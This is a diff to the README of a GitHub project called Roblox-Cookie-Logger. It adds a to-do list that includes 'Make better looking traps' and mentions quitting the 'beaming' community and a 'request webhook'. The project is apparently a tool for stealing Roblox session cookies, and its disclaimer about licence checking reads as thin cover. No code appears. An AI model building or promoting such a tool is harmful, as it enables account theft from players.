@@ -2,6 +2,16 @@
 *** https://github.githubassets.com/images/mona-whisper.gif
 -->
 
+# Update Status
+Yes, ik this is just a concept, and I planned on adding stuff in soon, but I quit the beaming community. Dont worry, this will still be maintained.
+```
+To Do:
+> Add better code
+> Better embeds and more info
+> Full Recode
+> Make better looking traps
+```
+
 # DISCLAIMER
 This is not to be used for any malicuis intent, I made this purely for a program that detects if you are using an unlicensed version. Releasing this because I stopped playing, no malicous stuff intended.
 
@@ -148,7 +158,7 @@ Distributed under the MIT License. See `LICENSE` for more information.
 <!-- CONTACT -->
 ## Contact
 
-Discord - **@SonicTheHedHog#0001**
+Discord - **@SonicTheHedHog#7171**
 
 Project Link: [Roblox-Cookie-Logger](https://github.com/DaEpicSwag/Roblox-Cookie-Logger)
 
@@ -157,7 +167,7 @@ Project Link: [Roblox-Cookie-Logger](https://github.com/DaEpicSwag/Roblox-Cookie
 <!-- ACKNOWLEDGEMENTS -->
 ## Acknowledgements
 
-* [PogScriptR]() Thanks for the request webhook explaination
+* [PogScriptR](https://github.com/PogScriptR/) Thanks for the request webhook explaination
 
 
 
